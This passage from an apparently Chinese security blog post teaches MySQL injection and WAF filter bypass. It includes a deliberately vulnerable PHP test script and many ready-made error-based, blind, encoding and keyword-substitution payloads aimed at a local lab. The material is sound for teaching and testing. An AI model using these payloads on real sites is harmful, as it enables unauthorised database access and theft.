id="5-3-字符串转换函数"><a href="#5-3-字符串转换函数" class="headerlink" title="5.3 字符串转换函数"></a>5.3 字符串转换函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char(49)</span><br><span class="line">hex(&apos;a&apos;)</span><br><span class="line">unhex(61)</span><br></pre></td></tr></table></figure><h3 id="5-4-报错注入常用函数"><a href="#5-4-报错注入常用函数" class="headerlink" title="5.4 报错注入常用函数"></a>5.4 报错注入常用函数</h3><h4 id="1-floor-rand-2-group-by"><a href="#1-floor-rand-2-group-by" class="headerlink" title="1. floor(rand()*2) + group by"></a>1. <code>floor(rand()*2)</code> + <code>group by</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))<span class="keyword">name</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">name</span>;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337263294608.jpg" alt=""></p><p>原理：<code>floor(rand(0)*2)</code>被计算多次导致。</p><h4 id="2-updatexml"><a href="#2-updatexml" class="headerlink" title="2. updatexml()"></a>2. <code>updatexml()</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337266295216.jpg" alt=""></p><p>原理：<code>updatexml()</code>第二个参数应为xml语句。</p><p>限制：最多32字符</p><h4 id="3-extractvalue"><a href="#3-extractvalue" class="headerlink" title="3. extractvalue()"></a>3. <code>extractvalue()</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337271173827.jpg" alt=""></p><p>原理：<code>extractvalue()</code>第二个参数应为xml语句。</p><p>限制：最多32字符</p><p>经过测试，在<code>mysql 5.7</code>的版本下，<code>exp()</code>、<code>geometrycollection()</code>、<code>multipoint()</code>、<code>polygon()</code>、<code>multipolygon()</code>、<code>linestring()</code>、<code>multilinestring()</code>无法使用。</p><p>在<code>mysql 5.5</code>版本下是可以使用上面几个函数进行报错注入的。</p><p>原理：BIGINT整型溢出</p><h3 id="5-5-时间盲注常用函数"><a href="#5-5-时间盲注常用函数" class="headerlink" title="5.5 时间盲注常用函数"></a>5.5 时间盲注常用函数</h3><h4 id="1-benchmark"><a href="#1-benchmark" class="headerlink" title="1. benchmark()"></a>1. <code>benchmark()</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">if</span>(<span class="keyword">LEFT</span>(<span class="keyword">VERSION</span>(),<span class="number">1</span>)=<span class="number">5</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="string">'1'</span>)),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337847193285.jpg" alt=""></p><p>原理：以上面的sql语句为例，<code>BENCHMARK()</code>将执行<code>SHA1(&#39;1&#39;)</code>这个工作5000000次，并统计其所花费的时间。</p><h4 id="2-sleep"><a href="#2-sleep" class="headerlink" title="2. sleep()"></a>2. <code>sleep()</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> freebuf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'A'</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">10</span>));</span><br></pre></td></tr></table></figure><h3 id="5-6-布尔盲注常用函数"><a href="#5-6-布尔盲注常用函数" class="headerlink" title="5.6 布尔盲注常用函数"></a>5.6 布尔盲注常用函数</h3><p>字符串截取函数+<code>ascii()</code>配合<code>limit</code>完成布尔盲注。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337864958694.jpg" alt=""></p><h1 id="0x02-Soup（调味汤）"><a href="#0x02-Soup（调味汤）" class="headerlink" title="0x02 Soup（调味汤）"></a>0x02 Soup（调味汤）</h1><p>这里总结了一下绕过基础过滤的方式。这边不说复写和大小写绕过了，因为大家都知道。</p><p>这边我写个基础的测试脚本，接下来的测试都是基于这个脚本而添加的相应的规则：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   $db = mysqli_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">   mysqli_select_db($db, <span class="string">'SecSpider'</span>);</span><br><span class="line">   $uid = strtolower($_GET[<span class="string">'uid'</span>]);</span><br><span class="line">   $id = waf($uid);</span><br><span class="line">   $query = <span class="string">"select id, title, tag from `freebuf` where id="</span>.$id.<span class="string">";"</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"sql: "</span>.$query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">   $result = mysqli_query($db, $query);</span><br><span class="line">   $row = mysqli_fetch_array($result);</span><br><span class="line">   var_dump($row);</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $id = str_replace(<span class="string">' '</span>, <span class="string">''</span>,$id);</span><br><span class="line">       <span class="keyword">return</span> $id;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="2-1-过滤空格"><a href="#2-1-过滤空格" class="headerlink" title="2.1 过滤空格"></a>2.1 过滤空格</h2><p>可以用下面几种方式绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/**/                            可代替空格</span><br><span class="line">/!*select all*/                 可代替空格，且能执行中间的sql语句</span><br><span class="line">()                              可代替空格</span><br><span class="line">%09 %0A %0B %0C %0D %A0 %20     可代替空格</span><br><span class="line">select~1或select+1或select-1</span><br><span class="line">select`table_name`from          可以不使用空格        </span><br><span class="line">+                               可代替空格</span><br><span class="line">&#123;&#125;                              在遇到select from时可以利用括号包裹绕过针对查询字段的空格过滤</span><br></pre></td></tr></table></figure><p>给个实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9999/php.php?uid=.1union(select~1,+1,(select`table_name`from/*!12345information_schema.tables%0awhere/**/table_schema=database()*/%0dlimit%0d%0a0,1))</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337949840847.jpg" alt=""></p><p>关于括号绕过的示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9999/php.php?uid=.1union(select-1,+1,&#123;x+table_name&#125;from&#123;x(information_schema.tables)&#125;where&#123;x(table_schema=database())&#125;)</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338902517730.jpg" alt=""></p><h2 id="2-2-过滤了逗号-默认加上了过滤空格"><a href="#2-2-过滤了逗号-默认加上了过滤空格" class="headerlink" title="2.2 过滤了逗号(默认加上了过滤空格)"></a>2.2 过滤了逗号(默认加上了过滤空格)</h2><p>在使用<code>union</code>的时候是比较害怕逗号被过滤的，可以用<code>join()</code>绕：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9999/php.php?uid=.1union(select+*from((select+1)a%0ajoin(select+2)b%0ajoin(select`table_name`from/**/information_schema.tables/**/where%0dtable_schema=database())c))</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337978509836.jpg" alt=""></p><p>注意这么几个细节：</p><ul><li>不能这么使用<code>/!*join*/</code></li><li><code>limit 0,1</code>中的逗号可以使用<code>limit 1 offset 0</code>这样的格式来代替</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9999/php.php?uid=.1union(select+*from((select+1)a%0ajoin(select+2)b%0ajoin(select`column_name`from/**/information_schema.columns/**/where%0dtable_name=%27freebuf%27/**/limit/**/1/**/offset/**/3)c))</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15337988471571.jpg" alt=""></p><h2 id="2-3-编码绕过"><a href="#2-3-编码绕过" class="headerlink" title="2.3 编码绕过"></a>2.3 编码绕过</h2><p>说了上面两个较为常规的姿势，下面总结一下使用编码绕过的方式：</p><h3 id="2-3-1-URL编码"><a href="#2-3-1-URL编码" class="headerlink" title="2.3.1 URL编码"></a>2.3.1 URL编码</h3><p>一般不会成功…，这个时候不妨试一试两次编码绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">空格 =&gt; %20</span><br><span class="line">单引号 =&gt; %27</span><br><span class="line">左括号 =&gt; %28</span><br><span class="line">右括号 =&gt; %29</span><br><span class="line">百分号 =&gt; %25</span><br></pre></td></tr></table></figure><h3 id="2-3-2-十六进制编码"><a href="#2-3-2-十六进制编码" class="headerlink" title="2.3.2 十六进制编码"></a>2.3.2 十六进制编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…     # 对单个字符编码</span><br><span class="line">SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))     #对字符串编码</span><br></pre></td></tr></table></figure><h3 id="2-3-3-Unicode编码"><a href="#2-3-3-Unicode编码" class="headerlink" title="2.3.3 Unicode编码"></a>2.3.3 Unicode编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</span><br><span class="line">空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</span><br><span class="line">左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</span><br><span class="line">右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</span><br></pre></td></tr></table></figure><p>关于应用的话个人认为有两种：</p><ul><li><p>宽字节注入</p><p>  关于宽字节注入，简单来说就是当单引号（<code>&#39;</code>）被转义为<code>\&#39;</code>时可以利用<code>%df%27</code>进行绕过。宽字节注入产生的原因是因为GBK编码为多字节编码，会认为两个字节代表一个汉字，举个例子，比如我传入的字段是<code>%df%27</code>，正常解码后为：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�&apos;</span><br></pre></td></tr></table></figure></li></ul><pre><code>而有趣的是在代码层（GBK编码）对`%df%27`的解析实际为`%df%5c%27`：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">運&apos;</span><br></pre></td></tr></table></figure>从而吃掉了`\`绕过了对`&apos;`的转义</code></pre><ul><li><p>MySQL字符编码绕过</p><p>  MySQL的字符串编码主要是由于MySQL字段的字符集和PHP mysqli客户端设置的字符集不同而导致的。</p><p>  MySQL字段的默认字符集为<code>latin1</code>，在设置客户端字符集为<code>utf8</code>后，服务端的相关字符集仍为<code>latin1</code>，所以PHP将数据存入数据库实际上完成了如下的字符编码转换：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utf8 --&gt; utf8 --&gt; latin1</span><br></pre></td></tr></table></figure></li></ul><pre><code>也就是会出现如下的情况：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &apos;Ä&apos;=&apos;A&apos;; # 结果为1</span><br></pre></td></tr></table></figure>详情请看[P牛的研究][1]</code></pre><h1 id="0x03-Main-Course（主菜）"><a href="#0x03-Main-Course（主菜）" class="headerlink" title="0x03 Main Course（主菜）"></a>0x03 Main Course（主菜）</h1><p>知道了上面的基础绕过姿势，下面进入正餐，测试脚本和0x02相同，只是往上添加规则罢了。</p><p><strong>测试MySQL版本为5.7.23</strong></p><h2 id="3-1-各种关键字的绕过"><a href="#3-1-各种关键字的绕过" class="headerlink" title="3.1 各种关键字的绕过"></a>3.1 各种关键字的绕过</h2><h3 id="3-1-1-绕and-or-union-where-limit-group-by-hex-substr"><a href="#3-1-1-绕and-or-union-where-limit-group-by-hex-substr" class="headerlink" title="3.1.1 绕and,or,union,where,limit,group by,hex,substr"></a>3.1.1 绕<code>and</code>,<code>or</code>,<code>union</code>,<code>where</code>,<code>limit</code>,<code>group by</code>,<code>hex</code>,<code>substr</code></h3><blockquote><p>绕and和or</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and =&gt; &amp;&amp;</span><br><span class="line">or =&gt; ||</span><br></pre></td></tr></table></figure><blockquote><p>绕union<br>union =&gt; 1 || </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,title from freebuf where id=1 || (select substr((select table_name from information_schema.tables where table_schema=database()),1,1))=&apos;f&apos; limit 0,1;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338119206129.jpg" alt=""></p><blockquote><p>绕where<br>where =&gt; case when then else end</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,title from freebuf where id=1 || (select substr((select (case table_schema WHEN &apos;SecSpider&apos; then table_name else &apos;zzzzzzzzzz&apos; END) as c  from information_schema.tables group by c limit 1),1,1))=&apos;f&apos; limit 0,1;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338147661315.jpg" alt=""></p><blockquote><p>绕limit<br>limit =&gt; group by c having c=0</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select id,title from freebuf where id=1 || (select((select substr((select (case table_schema when &apos;SecSpider&apos; then table_name else &apos;1&apos; end) as c  from information_schema.tables group by c having c=0</span><br><span class="line">),1,1))=&apos;f&apos;) as d group by d having d=1);</span><br></pre></td></tr></table></figure><p>如果表名第一个字符为<code>f</code>，则返回正常数据，如果不为<code>f</code>则返回空。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338669140591.jpg" alt=""></p><blockquote><p>绕group by<br>group by =&gt; group_concat()</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,title from freebuf where id=1 || (select substr((select replace(group_concat(distinct(case table_schema when &apos;SecSpider&apos; then table_name else &apos;&apos; end)), &quot;,&quot;, &quot;&quot;) from information_schema.tables),1,1)=&apos;f&apos;);</span><br></pre></td></tr></table></figure><p>同上，如果表名第一个字符为<code>f</code>，则返回正常数据，如果不为<code>f</code>则返回为空。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338669915616.jpg" alt=""></p><blockquote><p>绕select<br>其实是用了种取巧的方式即：<br>select =&gt; into outfile<br>但实际上是用处不大的，这边就不做演示了</p></blockquote><blockquote><p>绕hex<br>hex =&gt; lower(conv([10-36],10,36))</p></blockquote><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338686000398.jpg" alt=""></p><blockquote><p>绕substr或substring()<br>substr =&gt; mid() 或 strcmp(left())</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mid()</span><br><span class="line">select (select mid(table_name,1,1) from information_schema.tables where table_schema=database() limit 1)=lower(conv(14,10,36));</span><br><span class="line"></span><br><span class="line">strcmp(left())</span><br><span class="line">select strcmp(left(table_name,1),&apos;f&apos;) from information_schema.tables where table_schema=database() limit 1;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338696469393.jpg" alt=""></p><h3 id="3-1-2-绕过严格的字符或数字限制"><a href="#3-1-2-绕过严格的字符或数字限制" class="headerlink" title="3.1.2 绕过严格的字符或数字限制"></a>3.1.2 绕过严格的字符或数字限制</h3><p>具体的来说，当waf做了严格的字符限制后，可能某些字符我们是无法使用的，这个时候可以用下面这张表来绕过：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338689725975.jpg" alt=""></p><p>小写字符的释放可以使用<code>lower(conv([10-36],10,36))</code></p><h3 id="3-1-3-绕过information-schema"><a href="#3-1-3-绕过information-schema" class="headerlink" title="3.1.3 绕过information.schema"></a>3.1.3 绕过<code>information.schema</code></h3><p>在MySQL5.6及以上的版本，可以用<code>mysql.innodb_table_stats</code>和<code>mysql.innodb._index_stats</code>来代替。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select title from freebuf where id=1 union select table_name from mysql.innodb_table_stats where database_name=database() limit 0,1;</span><br><span class="line"></span><br><span class="line">select title from freebuf where id=1 union select table_name from mysql.innodb_index_stats where database_name=database() limit 0,1;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15341559722523.jpg" alt=""></p><h2 id="3-2-非常规注入方式"><a href="#3-2-非常规注入方式" class="headerlink" title="3.2 非常规注入方式"></a>3.2 非常规注入方式</h2><h3 id="3-2-1-order-by注入"><a href="#3-2-1-order-by注入" class="headerlink" title="3.2.1 order by注入"></a>3.2.1 order by注入</h3><p>为什么要把<code>order by</code>拉出来单独说呢，因为<strong><code>order by</code>后面不能使用union</strong>。</p><p>主要是用盲注，有两种姿势，下面用布尔盲注来演示。</p><ol><li><p>使用<code>if</code>来进行盲注：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select title from freebuf order by if((substr(user(),1,1)=&apos;a&apos;),1,(select 1 from information_schema.tables));</span><br></pre></td></tr></table></figure></li></ol><pre><code>这边要注意一下，在报错回显时一定要选择会产生错误的回显，而不要选择`0x00`，在`5.7.23`版本下`0x00`也会返回所有数据及正常情况。![](http://image-lucifaer.test.upcdn.net/2018/11/29/15338845878083.jpg)</code></pre><ol start="2"><li><p>使用<code>case when then else end</code>来进行盲注：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select title from freebuf order by (select case when(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&apos;f&apos;) then 1 else 1*(select 1 from information_schema.tables)end)=1 limit 0,1;</span><br></pre></td></tr></table></figure></li></ol><pre><code>![](http://image-lucifaer.test.upcdn.net/2018/11/29/15338850719592.jpg)</code></pre><ol start="3"><li><p>使用<code>procedure</code>进行报错注入或盲注：</p><p> <strong><code>limit</code>后的<code>procedure</code>在5.7.18下已经默认关闭了，在8.0版本下已经被移除。</strong></p><p> 报错注入：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1 from mysql.user order by 1 limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure></li></ol><pre><code>时间盲注：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1 from mysql.user order by 1 limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(50000000,SHA1(1)),1))))),1);</span><br></pre></td></tr></table></figure></code></pre><ol start="4"><li><p>使用<code>rand()</code>进行盲注</p><p> 这个不细说了，和普通的盲注一样。</p></li></ol><h3 id="3-2-2-limit注入"><a href="#3-2-2-limit注入" class="headerlink" title="3.2.2 limit注入"></a>3.2.2 limit注入</h3><p>重要的话再说一遍：</p><p><strong><code>limit</code>后的<code>procedure</code>在5.7.18下已经默认关闭了，在8.0版本下已经被移除。</strong></p><p>报错注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1 from mysql.user order by 1 limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure><p>时间盲注：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 1 from mysql.user order by 1 limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(50000000,SHA1(1)),1))))),1);</span><br></pre></td></tr></table></figure><h3 id="3-2-3-insert、update、delete注入"><a href="#3-2-3-insert、update、delete注入" class="headerlink" title="3.2.3 insert、update、delete注入"></a>3.2.3 insert、update、delete注入</h3><p>这边就拿报错注入来说了，其实改一改就是盲注。</p><ul><li><p>insert</p><p>  insert注入的位置在<code>value</code>处，可以配合常规的报错语句来完成报错注入，下面举个例子。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into freebuf (id, title, links, tag, article_id, catch_date, publish_date, come_from) values (2,&apos;1&apos; +  updatexml(0,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)),0) or &apos;&apos;,&apos;www.baidu.com&apos;,&apos;test1&apos;,&apos;2&apos;,&apos;1&apos;,&apos;1&apos;,&apos;baidu&apos;);</span><br></pre></td></tr></table></figure></li></ul><pre><code>![](http://image-lucifaer.test.upcdn.net/2018/11/29/15341459544177.jpg)这边要注意一下在`value`中的报错语句要使用的逻辑，为了使我们的报错语句一定执行，一定要构造逻辑使得报错函数可以执行。</code></pre><ul><li><p>update</p><p>  update注入位置在<code>set</code>后。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update freebuf set id=3 and updatexml(0,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),0) and title=&apos;123&apos; and links=&apos;123&apos; and tag=&apos;1&apos; and article_id=&apos;123&apos; and catch_date=&apos;1&apos; and publish_date=&apos;3&apos; and come_from=&apos;1&apos; where id=2;</span><br></pre></td></tr></table></figure></li></ul><pre><code>![](http://image-lucifaer.test.upcdn.net/2018/11/29/15341466190936.jpg)</code></pre><ul><li><p>delete</p><p>  delete注入的位置在<code>where</code>后。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE from freebuf where id=2 or updatexml(0,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),0) or &apos;&apos;;</span><br></pre></td></tr></table></figure></li></ul><pre><code>![](http://image-lucifaer.test.upcdn.net/2018/11/29/15341468358998.jpg)</code></pre><h2 id="3-3-畸形请求"><a href="#3-3-畸形请求" class="headerlink" title="3.3 畸形请求"></a>3.3 畸形请求</h2><p>php+Apache 特性：</p><p>waf通常会对请求进行严格的协议判断，比如GET、POST等，但是apache解析协议时却没有那么严格，所以在发包的时候修改为一个畸形的请求也可能绕过waf。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15338886423466.jpg" alt=""></p><h2 id="3-4-HPP——通用特性"><a href="#3-4-HPP——通用特性" class="headerlink" title="3.4 HPP——通用特性"></a>3.4 HPP——通用特性</h2><p>HPP是指HTTP参数污染-HTTP Parameter Pollution。当查询字符串多次出现同一个key时，根据容器不同会得到不同的结果。 假设提交的参数即为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&amp;id=2&amp;id=3</span><br></pre></td></tr></table></figure><ul><li>Asp.net + iis：<code>id=1,2,3</code></li><li>Asp + iis：<code>id=1,2,3</code></li><li>Php + apache：<code>id=3</code></li></ul><h2 id="3-5-Trick"><a href="#3-5-Trick" class="headerlink" title="3.5 Trick"></a>3.5 Trick</h2><h3 id="3-5-1-利用name-const-获取MySQL版本信息"><a href="#3-5-1-利用name-const-获取MySQL版本信息" class="headerlink" title="3.5.1 利用name_const()获取MySQL版本信息"></a>3.5.1 利用<code>name_const()</code>获取MySQL版本信息</h3><p>在5.7.23版本中并不能使用<code>name_const()</code>来获取更多的信息，但是仍可以用它来获取数据库版本信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM freebuf WHERE id=2 or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a)or &apos;&apos;;</span><br></pre></td></tr></table></figure><h3 id="3-5-2-limit下的字段数的判断"><a href="#3-5-2-limit下的字段数的判断" class="headerlink" title="3.5.2 limit下的字段数的判断"></a>3.5.2 limit下的字段数的判断</h3><p>在<code>where</code>条件下的字段数可以用<code>order by</code>判断，而limit后可以利用<code>1, into @,@</code>（@为字段数）判断字段数。@为mysql临时变量，</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15335651448794.jpg" alt=""></p><p>这里要记住要赋予用户变量变量名，不然会出现<code>User variable name &#39;&#39; is illegal</code>错误。</p><h3 id="3-5-3-MySQL注入可报错时绕过information-schema等关键字的过滤（报错）"><a href="#3-5-3-MySQL注入可报错时绕过information-schema等关键字的过滤（报错）" class="headerlink" title="3.5.3 MySQL注入可报错时绕过information_schema等关键字的过滤（报错）"></a>3.5.3 MySQL注入可报错时绕过<code>information_schema</code>等关键字的过滤（报错）</h3><p><strong>首先，如果MySQL注入是报错注入，且waf拦截了information_schema、columns、tables、database、schema等关键字或函数时</strong>，我们还可以这样玩：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select i.4 from (select * from (select 1)a, (select 2)b, (select 3)c, (select 4)d, (select 5)e, (select 6)f, (select 7)g, (select 8)h union select * from freebuf)i;</span><br></pre></td></tr></table></figure><p>这里是因为我<code>freebuf</code>表有8个字段，因为利用了<code>union select</code>所以要构造8个字段。</p><p>那如果过滤了<code>union</code>呢？</p><ol><li><p>用<code>polgon()</code>爆表名和库名</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from freebuf where id=1 and polygon(id);</span><br></pre></td></tr></table></figure></li></ol><pre><code>![](http://image-lucifaer.test.upcdn.net/2018/11/29/15341497758796.jpg)原理：`Polygon`从多个`LineString`或`WKB LineString`参数构造一个值 。如果任何参数不表示`LinearRing`（也就是说，不是一个封闭和简单的`LineString`），返回值就是NULL。如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。</code></pre><ol start="2"><li><p>用<code>join</code>重复查询爆字段</p><p> 爆第一个字段</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from freebuf where id=1 and (select * from (select 